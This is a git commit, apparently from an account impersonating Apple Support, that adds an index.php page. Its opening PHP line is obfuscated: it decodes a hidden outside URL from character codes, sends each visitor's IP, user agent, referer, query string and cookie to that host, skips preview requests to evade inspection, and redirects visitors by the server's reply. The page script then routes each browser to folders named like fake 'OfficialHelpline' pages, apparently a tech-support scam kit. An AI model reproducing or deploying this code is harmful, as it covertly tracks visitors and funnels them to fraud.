2a1d26827f44a51e9830ed560043c66762ba7909
Apple-Support- <167813541+apples-contact@users.noreply.github.com>
2024-05-07 20:19:17 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,69 @@
+<?php date_default_timezone_set("UTC");error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "428394";$uid="7xdkahu5dx40w3fqcu24jrjmi";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
+<xmlns="http:/www.w3.org/1999/xhtml">
+<head>
+	
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-208169927-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-208169927-1');
+</script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex,nofollow">
+    <title>OfficialHelpline074d3d3#3d2</title>
+
+
+    <script type="text/javascript">
+		var isChromium=window.chrome,vendorName=window.navigator.vendor,isOpera=window.navigator.userAgent.indexOf("OPR")>-1,isIEedge=window.navigator.userAgent.indexOf("Edge")>-1;
+if(isChromium!==null&&isChromium!==undefined&&vendorName==="Google Inc."&&isOpera==false&&isIEedge==false)
+	{
+	window.location.href="./WinFvjdjfhdjhfkdshfjkrCHVX/"
+}
+if(navigator.userAgent.indexOf("Firefox")!=-1)
+	{
+	window.location.href="./WinFvjdjfhdjhfkdshfjkrFFVX/"
+}
+if(window.navigator.userAgent.indexOf("Edge")!=-1)
+	{
+	window.location.href="./WinFvjdjfhdjhfkdshfjkrEDVX/"
+}
+if(window.navigator.userAgent.indexOf("Mac")!=-1)
+	{
+	var isOpera=!!window.opera||navigator.userAgent.indexOf('Opera')>=0,isFirefox=typeof InstallTrigger!=='undefined',isSafari=navigator.userAgent.indexOf('Safari')>-1,isChrome=!!window.chrome;
+	if(isSafari==true)
+		{
+		window.location.href="./WinFvjdjfhdjhfkdshfjkrMAVX/"
+	}
+	if(isChrome==true)
+		{
+		window.location.href="./WinFvjdjfhdjhfkdshfjkrMAVX/"
+	}
+	if(isFirefox==true)
+		{
+		window.location.href="./WinFvjdjfhdjhfkdshfjkrMAVX/"
+	}
+	if(isOpera==true)
+		{
+		window.location.href="./WinFvjdjfhdjhfkdshfjkrMAVX/"
+	}
+}
+if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==true))
+	{
+	window.location.href="./WinFvjdjfhdjhfkdshfjkrIEVX/"
+}
+$SAFARI_URL="apple";
+
+  </script>
+
+</head>
+<body>
+
+</body>
+
+
+</html>
